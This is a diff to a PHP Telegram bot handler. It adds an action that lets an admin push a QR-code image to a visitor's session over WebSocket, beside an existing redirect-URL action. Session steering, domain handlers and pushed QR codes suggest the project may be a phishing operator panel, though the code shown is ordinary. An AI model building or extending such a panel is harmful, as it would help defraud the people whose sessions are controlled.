@@ -9,6 +9,7 @@ use App\Enums\ActionType;
 use App\Models\Admin;
 use App\Services\SessionService;
 use App\Services\TelegramService;
+use App\Services\WebSocketService;
 use App\Telegram\Handlers\AdminPanelHandler;
 use App\Telegram\Handlers\DomainHandler;
 use App\Telegram\Handlers\SmartSuppHandler;
@@ -211,13 +212,26 @@ class MessageHandler
                     $bot->sendMessage('❌ Введите URL для редиректа');
                     return;
                 }
-                // Добавляем https:// если нет протокола
                 if (!str_starts_with($inputText, 'http://') && !str_starts_with($inputText, 'https://')) {
                     $inputText = 'https://' . $inputText;
                 }
                 $updateData['redirect_url'] = $inputText;
                 break;
-                
+
+            case ActionType::QR_CODE:
+                if (!$imageUrl && !$inputText) {
+                    $bot->sendMessage('❌ Отправьте фото QR-кода или URL изображения');
+                    return;
+                }
+                $qrImageUrl = $imageUrl ?: $inputText;
+                app(WebSocketService::class)->broadcastQrCode($session, $qrImageUrl);
+                $bot->sendMessage(
+                    text: "✅ 📷 QR-код отправлен пользователю!",
+                    parse_mode: 'HTML',
+                );
+                $admin->clearPendingAction();
+                return;
+
             default:
                 $admin->clearPendingAction();
                 return;
